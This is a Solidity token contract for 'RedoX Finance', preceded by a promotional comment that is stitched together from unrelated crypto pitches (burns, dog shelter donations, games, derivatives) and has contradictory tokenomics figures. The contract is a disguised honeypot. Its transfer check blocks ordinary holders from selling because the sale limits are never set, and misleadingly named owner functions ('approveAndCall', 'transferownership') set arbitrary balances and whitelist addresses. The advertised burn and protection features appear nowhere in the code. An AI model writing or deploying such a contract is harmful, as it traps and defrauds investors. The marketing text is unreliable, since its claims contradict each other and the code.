/*
https://redoxfinance.medium.com/
https://github.com/RedoxFinance
https://twitter.com/redoxfinance
https://telegram.me/redoxfinance


HALF-LIFE LIQUIDITY BURN?
Half-Life (symbol t1⁄2) is the time required for a quantity to reduce to half of its initial value. The term is commonly used in nuclear physics to describe how quickly unstable atoms undergo radioactive decay or how long stable atoms survive. The term is also used more generally to characterize any type of exponential or non-exponential decay. In the case of $REDOX, half-life refers to the time by which half of $REDOX tokens in liquidity are burned.


PUMP WARRANTY
With the first half-life burn in the history of cryptocurrencies on planet Earth, REDOX is always granting us neon green candles to fuel her spaceship with more and more radioactivity.


WHALE PROTECTION
Where REDOX comes from, society has long been social. That's what she expects from the earthlings too! She does not allow Earthlings to hold more than 2‰ (≙ 0.2%) of the total supply per wallet.


DUMP DEFENSE
To protect us from evil dumpers, REDOX has built-in a defense into the smart contract. It will not be possible to sell more $REDOX than 0.1‰ (≙ 0.01%) of the total supply per day and per wallet. Besides, the half-life principle will also protect us. Why is that? Simple. The moment people sell, more $REDOX end up in LP and get burned.


Remark: Due to trading, burn does not follow a constant curve. When people buy $REDOX, there are fewer tokens in the pool, so the burn slows down. When people sell $REDOX there are more tokens in the pool, which increases the burn rate.

Attention

If the maximum percentage per wallet is exceeded, the tokens that are ABOVE the limit are automatically burned on the holder's wallet.
We recommend not buying more than 90% of the announced max hold per wallet to avoid burnings. At current conditions this would be 2.6 ETH / 1,429 ,486 $REDOX.



ROADMAP

Phase 1

Website Launch
Whitepaper
Community Engagement via Social Media Begins
Token Launch on Uniswap
Listing on CoinGecko and CoinMarketCap
NFT Marketplace Launch
Collaboration with Top NFT creators
Sneak Peak of the Token Utilities
Listing on Tier 2 CEX (top 50)
Token Contract Audit
Funds donated to the dog shelter on completion of Phase 1

Phase 2
Token Launch on Pancakeswap and Bakeryswap
Staking & Farming Events
Merchandise & Goodies
Community Expansion
Promotional Marketing Campaign
REDOX/Meme Contest
Funds donated to the dog shelter on completion of Phase 2

Phase 3
Gamifying the REDOX NFT
Maximum token supply cap achieved
Roadmap for the future / New bone goals
Funds donated to the dog shelter on completion of Phase 3
To Be Announced


What is $REDOX token?

REDOX token has many use-cases, from rewarding players to the NFT marketplace, liquidity provider rewards, funding and governance.

$REDOX token use-cases
Incentive for users to play games on ERC-20 gaming platforms (reward)
In-game currency for future Minecraft related projects
Exchangable for rare in-game items and character skins (NFT's)
Exchangable for REDOX-tickets, play Battle Royale with REDOX tokens instead of $ETH
Governance (vote for game mechanic changes, new games to develop et cetera)
Liquidity rewards via innovative and engaging in-game mechanic
Project funding and maintenance

Tokenomics
$REDOX token is a ERC-20 token with a fixed supply of 500,000,000 of which 300,000,000 $REDOX circulate at launch.

Token allocation
Initial sale (0%): Fair Launch
Initial ETHSwap.io Liquidity (5%): 20,000,000
Liquidity rewards (20%): 100,000,000
Operations (20%): 100,000,000
Team (5%): 25,000,000


NFT Marketplace

REDOX GAME utilizes our custom developed Zilliqa bridge by tokenizing in-game assets. In traditional games 'owning' an in-game item does not actually make you the owner, whereas in REDOX GAME all your assets are saved on the blockchain in the form of NFT's (non-fungible tokens). This mechanic allows users to freely buy and sell items, revolutionizing the way game economics work.
Tokenized in-game assets can be anything from character cosmetics to in-game items. Every item has it's own rarity and can be obtained via either random rewards in-game or bought in limited edition sales using $REDOX.

REDOX GAME will launch it's own NFT marketplace alongside Battle Royale. This marketplace will be developed in a modular way, allowing future ERC-20 projects to easily tokenize their game assets using REDOX GAME as a base.


RedoX Finance — Where to?


With the growing popularity and technical improvement of swaps, lending pools, and other decentralized financial infrastructure, there is little doubt DeFi derivatives are about to revolutionize the market. Whether one looks at transactions, the number of users, or the overall growth of the industry, everything points upwards.
Having operated in this field for nearly two years, RedoX Finance has already deployed a successful product — decentralized options — and is about to launch a new one, decentralized leveraged tokens.
And we hardly intend to stop here. We will continue to add decentralized derivatives in the future, with RedoX Finance becoming a multi-faceted platform offering a variety of decentralized products.
We are striving to anticipate future trends and shall firmly adhere to the principle of decentralized legitimacy and the ethos of DeFi, while constantly updating our development strategy and offer to meet the needs of this ever-changing industry.
Our future direction will mainly follow these lines:
1. Decentralized derivatives trading platform. Several derivatives will be traded on RedoX, allowing a variety of investors to find products that correspond to their needs. Contrary to spot trading, where solutions are limited, with derivatives the possibilities are nearly endless.
2. Continue to innovate core products. Just as we have launched options and are about to introduce leveraged tokens, the RedoX team plans to create new derivative contracts, as well as optimize and improve old products. We would like to take this chance to remind users that the upcoming protocols will either not have owner permissions or the latter will use a time lock, with permissions being automatically discarded after the expiration date.
3. Innovative community products. The team will cooperate with developers from our community and beyond to launch derivative products entirely developed and operated by grassroots members. This will in turn enrich the RedoX Finance ecosystem and provide users with even more choices while carrying forward the logic of a truly decentralized platform.
As far as community products are concerned, the following principles will apply:
1) Community products must establish a connection with the REDOX token.
2) RedoX Finance will provide REDOX or other tokens to support new projects.
3) Community projects do not necessarily need a token of their own. If they do, they are encouraged to adhere to fair launch practices.
4) To be considered, community projects must focus on derivatives or aggregated products related to derivatives.
4. Multi-chain (Layer 2) deployment. Different derivatives will continue to be deployed on different public chains or Layer 2 based on performance requirements and users’ needs.

A Call to Redoxians — Time to Choose Where to Deploy
RedoX Finance is ready to deploy on the blockchain, a move that will effectively mark the start of our business operations, enabling our protocols to start functioning and providing our users and investors with the possibility to access our services. It will also pave the way for new and exciting products to be launched.
We naturally aim to be on multiple chains, since this means RedoX Finance would reach as many users as possible, expanding across communities. Eventually, we will deploy on Binance Smart Chain (BSC), Ethereum, Polygon, Wanchain, and possibly more.
However, launching too many pools at once would put serious pressure on our liquidity, which may spread thin and reduce rewards.
We, therefore, face a set of choices. On how many chains should RedoX Finance launch at first? Should liquidity be concentrated on a single space, so as to maximize its efficiency, or should it be spread between two communities? And which chain should be chosen as a first step?
It is an important decision and as usual, the core team has decided to stick to a decentralized logic. This means we want you to tell us what you think in an upcoming Twitter vote which will run from July 2nd to July 4th.
The crucial points of the matter are as follows:
RedoX Finance will soon deploy on the blockchain and activate its protocols
We need to decide whether to launch on only one chain at first or on two chains. (More than that would simply not be realistic.)
Launching on one chain first would allow us to focus our liquidity in a single space, maximizing rewards and improving users’ experience. Only later, as we grow in strength, we would spread on to other spaces.
Launching on two chains would mean immediately reaching more users.
The chains currently in play are BSC, Ethereum, Polygon, and Wanchain.
Either way, please remember we will eventually deploy on all of these spaces.
We invite the RedoX Finance community to actively participate in the vote. Make your voice heard!
*/

pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}


contract RedoxFinance {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}